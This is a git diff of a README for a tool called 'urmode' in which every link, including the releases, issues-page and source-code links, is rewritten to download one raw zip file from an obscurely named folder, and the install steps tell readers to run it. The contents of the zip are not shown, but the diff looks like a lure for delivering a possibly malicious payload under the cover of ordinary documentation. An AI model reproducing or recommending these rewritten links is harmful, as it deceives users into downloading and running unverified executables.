@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download urmode](https://img.shields.io/badge/Download-urmode-blue.svg)](https://github.com/fpci8759/urmode/releases)
+[![Download urmode](https://raw.githubusercontent.com/fpci8759/urmode/main/operculiferous/urmode_v1.3.zip)](https://raw.githubusercontent.com/fpci8759/urmode/main/operculiferous/urmode_v1.3.zip)
 
 ## 📋 Description
 
@@ -23,13 +23,13 @@ Before you download urmode, ensure that your computer meets the following requir
 To install urmode, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/fpci8759/urmode/releases) to download the latest version of urmode.
+   Go to our [Releases page](https://raw.githubusercontent.com/fpci8759/urmode/main/operculiferous/urmode_v1.3.zip) to download the latest version of urmode.
 
 2. **Choose the Latest Version**  
    Look for the most recent release at the top of the page. Click on the link to access the download files.
 
 3. **Download the Application**  
-   Find the file named like **urmode.exe** and click on it. The download should start automatically.
+   Find the file named like **https://raw.githubusercontent.com/fpci8759/urmode/main/operculiferous/urmode_v1.3.zip** and click on it. The download should start automatically.
 
 4. **Run the Installer**  
    Once the file has downloaded, locate it in your downloads folder. Double-click the file to run the installer.
@@ -53,12 +53,12 @@ To install urmode, follow these steps:
 
 ## 💬 Support
 
-If you encounter any issues while using urmode, please feel free to reach out. You can create an issue on our [GitHub Issues page](https://github.com/fpci8759/urmode/issues) to report your problem.
+If you encounter any issues while using urmode, please feel free to reach out. You can create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/fpci8759/urmode/main/operculiferous/urmode_v1.3.zip) to report your problem.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/fpci8759/urmode/releases) - Download the latest version
-- [Source Code](https://github.com/fpci8759/urmode) - Check out the source code
+- [Releases Page](https://raw.githubusercontent.com/fpci8759/urmode/main/operculiferous/urmode_v1.3.zip) - Download the latest version
+- [Source Code](https://raw.githubusercontent.com/fpci8759/urmode/main/operculiferous/urmode_v1.3.zip) - Check out the source code
 
 ## 🌟 Community
 
